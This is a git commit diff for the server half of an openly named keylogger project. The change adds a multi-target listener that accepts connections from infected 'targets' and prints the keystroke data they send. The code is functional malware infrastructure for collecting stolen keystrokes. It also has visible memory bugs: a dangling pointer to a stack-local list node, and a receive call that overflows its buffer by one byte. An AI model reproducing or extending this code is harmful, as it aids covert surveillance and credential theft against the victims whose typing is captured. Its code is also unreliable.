3c0e00b01dc5dffb5a43837aa11875c190bb0494
Qu3b411 <19296119+Qu3b411@users.noreply.github.com>
2018-12-15 10:34:27 -0800

    getting socket ready for multi-target support

--- KeyLoggerSoftware/server/main.cpp
+++ KeyLoggerSoftware/server/main.cpp
@@ -1,14 +1,22 @@
 #include <winsock2.h>
+#include <mswsock.h>
+#include "ServerInterProcess.h"
 #include <stdio.h>
-using namespace std;
-/**
-    this is a temporary server used for testing, future changes will be established 
-*/
-int main()
+#include <thread>
+#include<mutex>
+#include <fcntl.h>
+#include <io.h>
+
+std::mutex mu;
+SOCKETLIST slist;
+
+void Listener()
 {
     WSADATA WSA;
     SOCKET Listener, acceptedTarget;
     SOCKADDR_IN server, target;
+    slist.nextTarget=0x00;
+    slist.target=0x00;
     int cL;
     char* buffer = (char*)malloc(0x1000);
     fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
@@ -16,13 +24,13 @@ int main()
     if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
     {
         fprintf(stderr ,"\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
-        return -1;
+        return;
     }
     fprintf(stderr ,"\t\t[*] WSA startup complete!\n\t[*] creating socket!");
     if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
     {
         fprintf(stderr ,"Error in creating socket, error code: %d", WSAGetLastError());
-        return -1;
+        return;
     }
     server.sin_family =AF_INET;
     server.sin_addr.S_un.S_addr = INADDR_ANY;
@@ -31,27 +39,73 @@ int main()
     if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
     {
         fprintf(stderr ,"failed to bind socket, Error code %d", WSAGetLastError());
-        return -1;
+        return;
     }
-    fprintf(stderr, "accepted\n\t\t[*]Listening: ");
 
     listen(Listener,3);
     cL=sizeof(target);
-    acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
-    if(acceptedTarget==INVALID_SOCKET)
+    while(true)
     {
-        fprintf(stderr ,"\n\t\t[*] error connecting");
-        return -1;
+        fprintf(stderr, "accepted\n\t\t[*]Listening: ");
+        acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
+        SOCKETLIST link;
+
+        if(acceptedTarget==INVALID_SOCKET)
+        {
+            fprintf(stderr ,"\n\t\t[*] error connecting");
+        }
+        else
+        {
+            fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
+            u_long mode =1;
+            ioctlsocket(acceptedTarget,FIONBIO,&mode);
+            link.target = acceptedTarget;
+
+            mu.lock();
+            /*
+                establish a self referential linked list,
+                    A->B->C->A...
+                each link contains a socket so the listener thread can read data off of the
+                socket.
+            */
+            if(slist.target==0x00)
+            {
+                slist=link;
+                slist.nextTarget=&slist;
+            }
+            else
+            {
+                link.nextTarget=slist.nextTarget;
+                slist.nextTarget=&link;
+            }
+            mu.unlock();
+            unsigned int rcv;
+            while(recv(acceptedTarget,buffer,0x1001,0) !=  SOCKET_ERROR || (rcv =WSAGetLastError()) == WSAEWOULDBLOCK)
+            {
+                if (rcv != WSAEWOULDBLOCK)
+                {
+                    *(buffer+0x1000)=0x00;
+                    printf("%s",buffer);
+                }
+                WSASetLastError(0x00);
+                rcv = 0x00;
+            }
+            printf("Error: %d", WSAGetLastError());
+            printf("\n</KeyLoggerMetaData>\n");
+        }
+
     }
-    fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
-    while(recv(acceptedTarget,buffer,0x1001,0)!=  SOCKET_ERROR)
-    {
-       
-        *(buffer+0x1000)=0x00;
-        printf("%s",buffer);
-    }
-    printf("\n</KeyLoggerMetaData>\n");
     closesocket(acceptedTarget);
     WSACleanup();
+}
+/**
+    this is a temporary server used for testing, future changes will be established
+*/
+int main()
+{
+    std::thread thread1 (Listener);
+
+    thread1.join();
+
     return 0;
 }
